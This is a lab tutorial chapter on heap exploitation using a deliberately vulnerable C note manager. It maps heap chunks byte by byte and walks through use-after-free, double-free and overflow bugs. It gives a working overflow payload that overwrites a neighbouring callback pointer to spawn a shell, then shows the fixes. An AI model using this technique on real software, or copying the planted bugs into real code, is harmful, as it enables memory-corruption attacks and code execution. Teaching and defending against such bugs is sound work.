# Walkthrough 2 — A Realistic Note Manager, Mapped to the Heap

A **full menu-driven program** ([`notes.c`](notes.c), ~190 lines) that manages
dynamic objects the way real software does: a global table of pointers to
heap records, each record carrying a **callback** (like a C++ vtable slot or a
plugin handler) plus data, with create/read/update/delete commands. It has three
independent, production-style bugs. We map **each command to the exact heap
chunks and bytes it touches**, then weaponize the overflow into a shell, then fix
everything.

> Lab only, throwaway VM. `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`.

Files: [`notes.c`](notes.c) · [`exploit.py`](exploit.py)

---

## 0. Build & smoke test

```bash
gcc -g -O0 -fno-stack-protector -no-pie notes.c       -o notes       # vuln
gcc -g -O0 -fno-stack-protector -no-pie -DSAFE notes.c -o notes_safe  # fixed
gcc -g -O0 -fsanitize=address             notes.c      -o notes_asan  # detector
```
```bash
$ printf '1\nhello\n5\n6\n' | ./notes
== note manager ==
(hint for the lab: admin_shell is at 0x4012b4)
1 add  2 view  3 edit  4 delete  5 list  6 quit
> content: created note 0 at 0x...2b0 (print=0x401276)
>   [0] 0x...2b0 len=5 print=0x401276
> bye
```

---

## 1. The object model — one record = one heap chunk

```c
struct note {
    void (*print)(struct note *self);   /* OFFSET 0  — a CALLBACK (vtable-like) */
    size_t len;                          /* OFFSET 8                            */
    char   data[40];                     /* OFFSET 16                           */
};                                        /* sizeof = 56 bytes                  */
```

`malloc(sizeof(struct note))` = `malloc(56)`. glibc rounds the request up to a
16-aligned chunk: `56 + 8 (size field) = 64 = 0x40`. So **every note is a 0x40
chunk**, and all notes come from the same tcache bin — which makes reuse
perfectly predictable (Chapter 3).

The crucial design fact: **the callback `print` is the first 8 bytes of the
chunk.** Any bug that writes to a note's offset 0 — a UAF reclaim, or an overflow
from the chunk below — controls where a later `view` jumps.

---

## 2. Mapping two notes to real chunks

Create two notes and list them:

```bash
$ printf '1\nnote-A\n1\nnote-B\n5\n6\n' | ./notes
created note 0 at 0x...a2b0 (print=0x401276)
created note 1 at 0x...a2f0 (print=0x401276)
```

Note 1 is `0x40` above note 0 — adjacent chunks. Here is the byte-level map
(addresses from the run above; `A` = note 0, `B` = note 1):

```
   ADDRESS      FIELD                         NOTES
   0x...a2a0    A chunk: prev_size            A_user - 0x10  (chunk base)
   0x...a2a8    A chunk: size = 0x41          0x40 size | PREV_INUSE bit
   0x...a2b0    A->print   (callback)         <- malloc returned this (A_user)
   0x...a2b8    A->len
   0x...a2c0    A->data[0]                     A->data spans a2c0 .. a2e7 (40 B)
     ...
   0x...a2e8    B chunk: size = 0x41           == A->data + 40  (!!)
   0x...a2f0    B->print   (callback)          == A->data + 48  <- hijack target
   0x...a2f8    B->len
   0x...a300    B->data[0]
```

Read that twice. **`A->data` starts at `a2c0`; `B->print` is at `a2f0`.** The
distance is `0x30 = 48` bytes. So writing 48 bytes past the start of `A->data`
lands exactly on `B`'s callback pointer — and bytes 40..47 of `A->data` sit on
`B`'s chunk `size` field. This map is the entire exploit.

---

## 3. Mapping each command to memory

| Command | Code | Heap effect |
|---------|------|-------------|
| `add` | `malloc(56)`, `print=default_print`, bounded `memcpy` into `data` | allocates a fresh 0x40 chunk; **safe** (copy is clamped to 40) |
| `view` | `notes[i]->print(notes[i])` | **indirect call** through chunk offset 0 |
| `edit` | `memcpy(notes[i]->data, tmp, len)` with attacker `len` | **overflow (bug C)** — writes `len` bytes into a 40-byte field |
| `delete` | `free(notes[i])` (slot not cleared) | chunk → tcache[0x40]; pointer **dangles (bugs A+B)** |
| `list` | prints pointers/len/print | your recon tool |

Three bugs fall straight out of this table:

- **(A) Use-after-free:** `delete` frees the chunk but leaves `notes[i]` pointing
  at it, so a later `view`/`edit` dereferences freed memory.
- **(B) Double free:** `delete` twice on the same slot puts the chunk on the
  tcache free list twice.
- **(C) Heap overflow:** `edit`'s `len` isn't bounded to `sizeof(data)`.

---

## 4. Headline exploit — overflow a note into its neighbor's callback → shell

Plan, in terms of the §2 map:
1. `add` note 0 (chunk A) and note 1 (chunk B, `A+0x40`).
2. `edit` note 0 with `len = 56` and content =
   `b"A"*40 + p64(0x41) + p64(admin_shell)`:
   - 40 bytes fill `A->data`,
   - the next 8 bytes rewrite **B's chunk size** (we keep it `0x41` so nothing
     downstream complains),
   - the final 8 bytes overwrite **B->print** with `admin_shell`'s address.
3. `view` note 1 → `notes[1]->print(notes[1])` → calls `admin_shell` → shell.

`admin_shell`'s address is fixed (`-no-pie`) and printed in the banner.

```bash
$ admin=$(./notes <<< '6' | sed -n 's/.*admin_shell is at //p' | tr -d ')')
$ (python3 exploit.py overflow $admin; echo 'id; cat /etc/hostname') | ./notes
...
> index: [admin_shell] note callback hijacked -> shell (lab only)
uid=0(root) gid=0(root) groups=0(root)      # we are in the spawned shell
```

`exploit.py overflow` builds exactly the menu script and the binary payload
above. Note the assertion in it: the payload must contain **no newline byte**
(`0x0a`), because `edit` reads the content with `fgets`, which stops at a
newline. `admin_shell = 0x4012b4` and `0x41` contain no `0x0a`, so the raw
address passes through intact — a real bad-char constraint (Chapter 16 §16.6).

Confirm with ASan that this is a genuine heap overflow, not luck:
```bash
$ (python3 exploit.py overflow $admin) | ./notes_asan
==...==ERROR: AddressSanitizer: heap-buffer-overflow ... WRITE of size 56
    #0 ... in edit_note notes.c:...  'data'
```

---

## 5. Bug A — use-after-free, mapped

```bash
$ python3 exploit.py uaf | ./notes_asan
# add note 0 ; delete note 0 ; view note 0
==...==ERROR: AddressSanitizer: heap-use-after-free READ ...
    #0 ... in view_note          (the notes[i]->print(...) call)
    freed by thread T0 here:  ... in delete_note   (the free)
    previously allocated:     ... in add_note       (the malloc)
```

What happens without ASan: after `free`, glibc writes the tcache `next` and
`key` into the **first 16 bytes** of the chunk — i.e. over `A->print` and
`A->len`. So `view` now reads a **tcache pointer** as the callback and calls it →
crash (or, with grooming, a controlled value). The three ASan stacks
(alloc/free/use) are the signature of every UAF.

**Why it's powerful.** If we could reclaim A's freed chunk with 8 attacker bytes
at offset 0, `view` would call our pointer. In *this* program `add` always writes
`default_print` at offset 0, so the clean code-exec path here is the overflow
(§4); the UAF is shown as a detected crash. In programs where a reclaiming
allocation controls offset 0 (different object types sharing a bin), the UAF
*is* the code-exec primitive — see Chapter 6 §6.3 and `src/07_uaf_fnptr.c`.

---

## 6. Bug B — double free, mapped

```bash
$ python3 exploit.py doublefree | ./notes_asan
# add note 0 ; delete note 0 ; delete note 0
==...==ERROR: AddressSanitizer: attempting double-free ...
```
On a plain glibc build you instead get *"free(): double free detected in
tcache 2"* — glibc's **tcache key** check (Chapter 6 §6.6) spotting the same
chunk freed twice. Either way the chunk is now on the free list twice, so two
future `add`s would hand out the **same** memory (aliasing → the fastbin/tcache
"dup" primitive of Chapter 5).

---

## 7. The fixes, mapped to the same lines

`-DSAFE` changes exactly the lines that cause each bug:

```c
/* bug C (edit overflow): bound len to the destination before copying */
if (len < 0 || (size_t)len > DATA_CAP) { puts("length too large"); return; }
memcpy(notes[i]->data, tmp, (size_t)len);

/* bugs A + B (delete UAF/double-free): clear the slot after freeing */
free(notes[i]);
notes[i] = NULL;        /* now view/edit see "bad index"; a 2nd delete is a no-op */
```

Verify the same attacks now fail safely:
```bash
$ python3 exploit.py overflow 0x4012b4 | ./notes_safe
> ... new content: length too large          # overflow refused

$ python3 exploit.py uaf       | ./notes_safe
> ... index: bad index                        # dangling access refused

$ python3 exploit.py doublefree | ./notes_safe
> ... deleted
> ... bad index                               # second delete is a no-op
```

Defense in depth (Chapter 13): keep a modern glibc (tcache key + Safe-Linking),
build Full RELRO (`-Wl,-z,relro,-z,now`), and fuzz the command loop under ASan so
none of these ship. The real structural fix is **single ownership** —
`free(p); p = NULL;` is the C version; `unique_ptr`/RAII (C++) or Rust remove the
class.

---

## 8. Takeaways

- **Objects are chunks; fields are offsets.** `print` at offset 0 made the
  neighbor's callback reachable from an overflow 48 bytes into `data`.
- **Same-size objects share a tcache bin → deterministic reuse**, which is what
  makes UAF and double-free exploitable, not just crashy.
- **The map is measurable:** two `list` outputs showed `B = A + 0x40`, and the
  struct offsets gave `A->data → B->print = 48`.
- **Each bug = one wrong line**, and each fix = one bounded/validated line.

Back to the chapters: **[Chapter 5 — Heap techniques](../../05-heap-techniques.md)**
(tcache poisoning, where reclaiming controls offset 0) and
**[Chapter 6 — Use-after-free](../../06-use-after-free.md)**.
